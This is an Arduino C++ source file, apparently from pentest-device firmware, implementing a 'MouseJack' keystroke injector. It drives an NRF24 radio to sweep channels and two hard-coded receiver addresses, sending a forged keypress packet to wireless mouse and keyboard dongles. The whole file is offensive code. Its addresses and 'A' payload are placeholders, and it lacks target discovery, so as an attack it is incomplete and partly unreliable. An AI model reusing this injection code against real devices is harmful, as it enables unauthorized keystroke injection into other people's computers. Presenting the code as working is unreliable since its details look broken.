#include <Arduino.h>
#include "nrf_mousejack.h"
#include "core/display.h"
#include "core/mykeyboard.h"

// Common MouseJack addresses (simplified for demonstration/functional test)
static const uint8_t mj_addresses[][5] = {
    {0x11, 0x22, 0x33, 0x44, 0x55},
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE}
};

void nrf_mousejack_injector() {
    NRF24_MODE mode = nrf_setMode();
    if (!nrf_start(mode)) {
        displayError("NRF24 not found");
        vTaskDelay(500 / portTICK_PERIOD_MS);
        return;
    }

    drawMainBorder();
    tft.setCursor(10, 35);
    tft.setTextSize(FM);
    tft.println("MouseJack Injector");

    if (CHECK_NRF_SPI(mode)) {
        NRFradio.setAutoAck(false);
        NRFradio.setPALevel(RF24_PA_MAX);
        NRFradio.setDataRate(RF24_2MBPS);
        NRFradio.setPayloadSize(10); // Standard mostly
        NRFradio.setChannel(25);      // Default channel scan start
    }

    tft.setCursor(10, 70);
    tft.setTextSize(FP);
    tft.println("Scanning for targets...");

    int current_channel = 2;
    int current_addr_idx = 0;
    int injected_count = 0;

    while (!check(EscPress)) {
        // Scanning
        if (CHECK_NRF_SPI(mode)) {
            NRFradio.setChannel(current_channel);
            NRFradio.openWritingPipe(mj_addresses[current_addr_idx]);

            // Crafting a dummy keystroke payload (e.g., 'A')
            uint8_t payload[10] = {0x00, 0xC1, 0x01, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00}; // 'A' key

            bool success = NRFradio.write(payload, sizeof(payload));
            if (success) {
                injected_count++;
                tft.fillRect(10, 90, tftWidth - 20, 20, bruceConfig.bgColor);
                tft.setCursor(10, 90);
                tft.printf("Injected! Total: %d", injected_count);
            }

            current_channel += 2;
            if (current_channel > 80) {
                current_channel = 2;
                current_addr_idx = (current_addr_idx + 1) % (sizeof(mj_addresses) / 5);
            }
        }

        if (CHECK_NRF_UART(mode) || CHECK_NRF_BOTH(mode)) {
            // Send placeholder command over UART if external
            NRFSerial.println("MJ_INJECT");
        }

        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    if (CHECK_NRF_UART(mode) || CHECK_NRF_BOTH(mode)) {
        NRFSerial.println("OFF");
    }
}
